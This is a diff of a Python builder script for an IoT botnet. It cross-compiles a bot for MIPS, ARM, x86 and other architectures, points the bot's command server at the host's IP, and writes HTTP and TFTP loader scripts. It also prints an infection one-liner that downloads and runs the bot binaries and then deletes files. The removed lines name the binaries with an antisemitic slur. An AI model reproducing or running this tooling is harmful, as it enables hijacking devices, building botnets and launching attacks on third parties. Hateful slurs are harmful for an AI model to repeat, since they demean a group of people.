@@ -14,7 +14,8 @@ if len(sys.argv) < 0:
     sys.exit(1)
     
 bot = "bot.c"
-ip = urllib.urlopen('http://api.ipify.org').read()
+ip = urllib.urlopen('http://ipv4.icanhazip.com').read().strip("\n")
+
 skid = raw_input("Y/n Get Arch - ")
 if skid.lower() == "y":
     run("yum install python-paramiko nano screen gcc perl wget lbzip unzip -y")
@@ -24,15 +25,15 @@ if skid.lower() == "y":
 else:
     get_arch = False
 
-compileas = ["fuckjewishpeople.mips",   #mips  
-             "fuckjewishpeople.mpsl",   #mpsl  
-             "fuckjewishpeople.x86",    #x86   
-             "fuckjewishpeople.ppc",    #ppc   
-             "fuckjewishpeople.sparc",  #sparc 
-             "fuckjewishpeople.arm4",   #arm4  
-             "fuckjewishpeople.arm5",   #arm5  
-             "fuckjewishpeople.arm6",
-             "fuckjewishpeople.arm7"]   #arm6  
+compileas = ["cashmoneybot.mips",   #mips  
+             "cashmoneybot.mpsl",   #mpsl  
+             "cashmoneybot.x86",    #x86   
+             "cashmoneybot.ppc",    #ppc   
+             "cashmoneybot.sparc",  #sparc 
+             "cashmoneybot.arm4",   #arm4  
+             "cashmoneybot.arm5",   #arm5  
+             "cashmoneybot.arm6",
+             "cashmoneybot.arm7"]   #arm6  
 
 getarch = ['http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2',           #downloading -> mips   
            'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2',         #downloading -> mpsl     
@@ -64,9 +65,12 @@ try:
 except:
     pass
 
-old1 = "*commServer[] "
-new1 = "unsigned char *commServer[] = {\""+ ip +":4258\"};\n"
-x  = fileinput.input(files="/root/bot.c", inplace=1)
+old1 = "unsigned char *commServer[]"
+#old1 = "unsigned char *commServer[] = {\"159.223.143.72:4258\"};"
+#new1 = 'unsigned char *commServer[] = {\""+ ip +":4258\"};'
+new1 = 'unsigned char *commServer[] = {"' + ip + ':4258"};\n'
+
+x  = fileinput.input(files="./bot.c", inplace=1)
 for line in x:
     if old1 in line:
         line = new1;
@@ -151,16 +155,19 @@ run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/tftp2.sh')
 
 run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp2.sh')
 
-run('echo -e "#!/bin/bash" > /var/www/html/fuckjewishpeople.sh')
+run('echo -e "#!/bin/bash" > /var/www/html/cashmoneybot.sh')
 
 for i in compileas:
-    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 ' + i + ';wget http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/fuckjewishpeople.sh')
+    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 ' + i + ';wget http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/cashmoneybot.sh')
     run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 ' + i + ';tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp1.sh')
     run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 ' + i + ';tftp -r ' + i + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp2.sh')
 run("service xinetd restart")
 run("service httpd restart")
 run("ulimit -n 999999; ulimit -u 999999; ulimit -e 999999")
 run('echo -e "ulimit -n 99999" >> ~/.bashrc')
-run('rm -rf cross-compiler-armv4l cross-compiler-armv5l cross-compiler-armv6l cross-compiler-armv7l cross-compiler-i586 cross-compiler-i686 cross-compiler-m68k cross-compiler-mips cross-compiler-mipsel cross-compiler-powerpc cross-compiler-powerpc-440fp cross-compiler-sh4 cross-compiler-sparc cross-compiler-x86_64')
+
+# You can uncomment this but it just saved me from having to download it each time
+#run('rm -rf cross-compiler-armv4l cross-compiler-armv5l cross-compiler-armv6l cross-compiler-armv7l cross-compiler-i586 cross-compiler-i686 cross-compiler-m68k cross-compiler-mips cross-compiler-mipsel cross-compiler-powerpc cross-compiler-powerpc-440fp cross-compiler-sh4 cross-compiler-sparc cross-compiler-x86_64')
+
 print("\x1b check directory /var/www/html to make sure binarys created")
-print("skid payload# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/fuckjewishpeople.sh; chmod 777 fuckjewishpeople.sh; sh fuckjewishpeople.sh; tftp " + ip + " -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g " + ip + "; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *\x1b[0m")
+print("skid payload# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/cashmoneybot.sh; chmod 777 cashmoneybot.sh; sh cashmoneybot.sh; tftp " + ip + " -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g " + ip + "; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *\x1b[0m")
